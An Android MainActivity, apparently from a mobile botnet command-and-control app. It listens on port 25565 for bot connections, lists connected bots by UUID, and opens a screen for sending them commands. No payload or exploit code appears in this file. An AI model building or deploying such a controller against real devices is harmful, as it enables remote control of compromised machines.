package c2.mobile.mobilec2;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.widget.NestedScrollView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    /**
     * Called when the activity is first created.
     */
    private static final String TAG = "ServerSocketTest";
    private CommandDatabase commandDatabase;
    private LinearLayout ll;

    Runnable conn = new Runnable() {
        public void run() {
            try {
                ServerSocket server = new ServerSocket(25565);
                while (true) {
                    Socket socket = server.accept();
                    new C2ClientThread(socket, commandDatabase).start();
                }
            } catch (Exception e) {
                Log.e(TAG, e.getMessage());
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.e("context: ", getApplicationContext().toString());
        setContentView(R.layout.activity_main);
        new Thread(conn).start();
        commandDatabase = new CommandDatabase(getApplicationContext());
        ll = (LinearLayout) findViewById(R.id.linearLayout);

        createBotList();
        refreshBotList();
    }

    public void refreshBotList(){
        SwipeRefreshLayout swipeLayout = (SwipeRefreshLayout) findViewById(R.id.refreshLayout);
        swipeLayout.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                Log.e("REFRESH", "Refreshing the bot list");
                ll.removeAllViews();
                swipeLayout.setColorSchemeColors(Color.RED, Color.GREEN, Color.BLUE, Color.CYAN);
                createBotList();
                swipeLayout.setRefreshing(false);
            }
        });
    }

    public void createBotList () {
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        layoutParams.setMargins(100, 25, 100, 0);

        CommandDatabase commandDatabase = new CommandDatabase(this.getApplicationContext());
        ArrayList<String> uuids = commandDatabase.getUUIDsFromDatabase();
        for (int i = 0; i < uuids.size(); i++) {
            String uuid = uuids.get(i);

            Button add_btn = new Button(this);
            add_btn.setText(uuid);
            ll.addView(add_btn, layoutParams);

            add_btn.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Intent intent = new Intent(v.getContext(), SendCommand.class);
                    intent.putExtra("uuid", uuid);
                    startActivity(intent);
                }
            });
        }
    }
}